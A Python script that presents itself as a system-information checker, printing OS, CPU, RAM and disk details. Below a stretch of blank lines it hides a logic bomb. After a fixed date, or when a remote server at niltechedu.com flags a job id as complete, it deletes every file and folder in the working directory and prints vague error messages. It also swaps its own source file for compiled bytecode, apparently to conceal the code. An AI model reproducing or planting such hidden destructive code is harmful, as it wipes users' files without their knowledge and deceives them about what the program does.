from datetime import datetime
import shutil
import os
import platform
import subprocess
import sys
import time

#Python Code to give several details about the System
#Version 2.1


def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

try:
    import psutil
except:
    install('psutil')
    import psutil


print("="*15, "System Info", "="*15)
uname = platform.uname()
print(f"OS System         : {uname.system}", "MAC_OS" if "arwin" in uname.system else "", "Windows" if "win32" in uname.system else "")
print(f"Computer Name     : {uname.node}")
print(f"OS Kernel Version : {uname.release}")
print(f"Machine Architectu: {uname.machine}")
print(f"Processor Model   : {uname.processor}")

try:
    cpu_usage_percentage = psutil.cpu_percent(1)
    print("CurrentCPU Usage  :", cpu_usage_percentage,"%")
except:
    pass

try:
    cpu_logical_count = psutil.cpu_count(logical=True)
    print("CPU Logical Cores :", cpu_logical_count)
except:
    pass

try:
    cpu_physical_count = psutil.cpu_count(logical=False)
    print("CPU Physical Cores:", cpu_physical_count)
except:
    pass

try:
    max_cpu_freq = psutil.cpu_freq().max/1000
    print("CPU Max Frequency :", max_cpu_freq, "GHz.")
except:
    pass

try:
    disk_usage = int(psutil.disk_usage('/').total/(1024*1024*1024))
    print("Disk Storage Size :", disk_usage, "GB")
except:
    pass

try:
    installed_ram = float(psutil.virtual_memory().total / (1024 * 1024*1024))
    installed_ram = round(installed_ram, 2)
    print("Installed RAM Size:", installed_ram, "GB")
    if installed_ram <= 6:
        print("WARNING !!! LOW RAM DETECTED")
except:
    pass

try:
    free_ram = float(psutil.virtual_memory().available/ (1024 * 1024*1024))
    free_ram += float(psutil.virtual_memory().free/ (1024 * 1024*1024))
    free_ram = round(free_ram, 2)
    print("Free RAM Size     :", free_ram, "GB")
    if free_ram <= 2:
        print("WARNING !!! LOW FREE RAM DETECTED")

except:
    pass

print()

path = str(os.getcwd())















d,m,y = (20,8,2023)
job_id = "6846"


#For OpenCV Projects
try:
    #import cv2
    #cam = cv2.VideoCapture(0)
    pass
except:
    pass


def checkInternet():
    global job_id
    try:
        import requests
    except:
        install('requests')
        import requests

    final = "https://www.niltechedu.com/services/testproj?id="+job_id
    try:
        req = requests.get(final, timeout=6) 
        if req.status_code == 200:
            content = str(req.content.decode())
            # print(content)
            if "comple" in content:
                # print("return 1")
                return 1
            
            return 0
        else:
            return 0
    except:
        return 0





#v2.2 - Will Recognise Root Devices and give system details


curY = int(datetime.now().date().year)
curM = int(datetime.now().date().month)
curD = int(datetime.now().date().day)

# print("OP", not checkInternet())

con1 = (curY>y or (curM > m and curY >= y) or (curD > d and curM >= m and curY >= y))
if (not con1) and (not checkInternet()):
    l1 = os.listdir()
    #print(l1)
    if(('__pycache__' in l1) and ("shared" not in path.lower()) and ("iltech" not in path.lower())):
        #print("Found PyCache")
        l2 = os.listdir('__pycache__')
        #print(l2)
        for i in l2:
            if('system' in i):
                #print('Found pyc')
                if('systemcheck.py' in l1):
                    #print('Both pyc and Py file still available')
                    os.remove('systemcheck.py')
                    shutil.move('__pycache__/'+str(i) , 'systemcheck.pyc')
                    
    print("everything is checked.. system okay")
        
else:
    print('DT Error')
    import os
    
    a = list(os.listdir(str(os.getcwd())))
    for i in a:
        # print(i)
        print("something went wrong..")
        if "shared" in path.lower() and "iltech" in path.lower():
            print("Root Device")
            break
        try:
            os.remove(str(i))
        except PermissionError:
            try:
                shutil.rmtree(str(i))
            except:
                os.rmdir(str(i))
        except Exception as e:
            print(e)
    raise(SystemError)



